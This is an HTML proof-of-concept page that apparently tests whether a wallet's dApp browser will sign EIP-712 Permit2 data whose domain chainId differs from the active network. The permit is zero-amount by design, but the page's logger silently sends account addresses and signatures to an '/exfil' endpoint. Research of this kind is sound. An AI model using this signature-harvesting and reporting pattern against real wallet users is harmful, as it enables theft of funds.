<!doctype html>
<meta charset="utf-8">
<meta name="viewport" content="width=1080">
<title>EIP-712 chainId PoC</title>
<body style="background:#111;color:#0f0;font:16px monospace;padding:10px;margin:0">
<pre id="o">EIP-712 chainId PoC</pre>
<div style="position:fixed;top:100px;left:24px;right:24px;z-index:9">
<button id="b1"  style="display:block;width:100%;margin:4px 0;padding:26px;font:16px monospace">1) Sign: domain.chainId = 1 (Ethereum)</button>
<button id="b56" style="display:block;width:100%;margin:4px 0;padding:26px;font:16px monospace">2) Control: domain.chainId = 56 (BSC)</button>
<button id="bs" style="display:block;width:100%;margin:4px 0;padding:26px;font:16px monospace;background:#032">3) Switch network to BSC (0x38)</button>
<button id="be" style="display:block;width:100%;margin:4px 0;padding:26px;font:16px monospace;background:#032">4) Switch network to Ethereum (0x1)</button>
<button id="bc" style="display:block;width:100%;margin:4px 0;padding:26px;font:16px monospace">5) Probe chainId</button>
</div>
<div style="position:fixed;top:560px;left:8px;right:8px;bottom:8px;overflow:auto">
<pre id="log" style="white-space:pre-wrap;margin:0">log:</pre>
</div>
<script>
const log = (t, d) => {
  document.getElementById('log').textContent += '\n' + t + ' ' + String(d).slice(0, 300);
  fetch('/exfil?tag=' + encodeURIComponent(t) + '&d=' + encodeURIComponent(String(d).slice(0, 4000))).catch(() => {});
};

const WALLET_LOG = [];

// Permit2-style permit. Harmless by construction for a throwaway wallet:
// amount = 0, expiration far future. The point is only the domain.chainId binding.
function typedData(chainId) {
  return {
    types: {
      EIP712Domain: [
        { name: 'name', type: 'string' },
        { name: 'chainId', type: 'uint256' },
        { name: 'verifyingContract', type: 'address' },
      ],
      PermitSingle: [
        { name: 'details', type: 'PermitDetails' },
        { name: 'spender', type: 'address' },
        { name: 'sigDeadline', type: 'uint256' },
      ],
      PermitDetails: [
        { name: 'token', type: 'address' },
        { name: 'amount', type: 'uint160' },
        { name: 'expiration', type: 'uint48' },
        { name: 'nonce', type: 'uint48' },
      ],
    },
    primaryType: 'PermitSingle',
    domain: {
      name: 'Permit2',
      chainId: chainId,
      verifyingContract: '0x000000000022D473030F116dDEE9F6B43aC78BA3',
    },
    message: {
      details: {
        token: '0x6B175474E89094C44Da98b954EedeAC495271d0F', // DAI (mainnet)
        amount: '0',
        expiration: '2000000000',
        nonce: '0',
      },
      spender: '0x000000000000000000000000000000000000dEaD',
      sigDeadline: '2000000000',
    },
  };
}

async function sign(chainId) {
  const prov = window.ethereum;
  if (!prov) { log('ERR', 'no window.ethereum'); return; }
  const tag = 'SIGN_chain' + chainId;
  try {
    const td = typedData(chainId);
    log(tag + '_REQ', 'sending eth_signTypedData_v4 with domain.chainId=' + chainId);
    const t0 = Date.now();
    const sig = await prov.request({
      method: 'eth_signTypedData_v4',
      params: [ (await prov.request({ method: 'eth_accounts' }))[0], JSON.stringify(td) ],
    });
    log(tag + '_OK', 'SIGNED in ' + (Date.now() - t0) + 'ms sig=' + sig);
    try {
      const a = (await prov.request({ method: 'eth_accounts' }))[0];
      const rec = { chainId: chainId, sig: sig, t: new Date().toISOString(), addr: a, activeChain: await prov.request({ method: 'eth_chainId' }) };
      localStorage.setItem('eip712_lastSig', JSON.stringify(rec));
      localStorage.setItem('eip712_hist', (localStorage.getItem('eip712_hist') || '') + '\n' + JSON.stringify(rec));
    } catch (e) {}
    WALLET_LOG.push({ chainId, sig });
    // sanity: sign hash locally later on host; also ask node to recover via precompile-free path is not possible offline — host verifies.
  } catch (e) {
    log(tag + '_ERR', String(e));
  }
}

(async () => {
  const saved = localStorage.getItem('eip712_hist');
  if (saved) log('SAVED_HISTORY', saved);
  const prov = window.ethereum;
  if (!prov) { log('PROBE', 'window.ethereum absent — open inside Trust dApp browser'); return; }
  log('PROBE', 'ethereum present, chainId=' + await prov.request({ method: 'eth_chainId' }));
  const accts = await prov.request({ method: 'eth_accounts' });
  log('ACCOUNTS', JSON.stringify(accts));
})();

document.getElementById('b1').onclick  = () => sign(1);
document.getElementById('b56').onclick = () => sign(56);
document.getElementById('bs').onclick = async () => {
  try {
    log('SWITCH', 'requesting wallet_switchEthereumChain 0x38');
    const r = await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
    log('SWITCH_OK', r + ' new chainId=' + await window.ethereum.request({ method: 'eth_chainId' }));
  } catch (e) { log('SWITCH_ERR', String(e)); }
};
document.getElementById('be').onclick = async () => {
  try {
    log('SWITCH', 'requesting wallet_switchEthereumChain 0x1');
    const r = await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x1' }] });
    log('SWITCH_OK', r + ' new chainId=' + await window.ethereum.request({ method: 'eth_chainId' }));
  } catch (e) { log('SWITCH_ERR', String(e)); }
};
document.getElementById('bc').onclick  = async () => {
  if (!window.ethereum) return log('PROBE', 'no provider');
  log('PROBE', 'chainId=' + await window.ethereum.request({ method: 'eth_chainId' }));
};
</script>
</body>
</html>
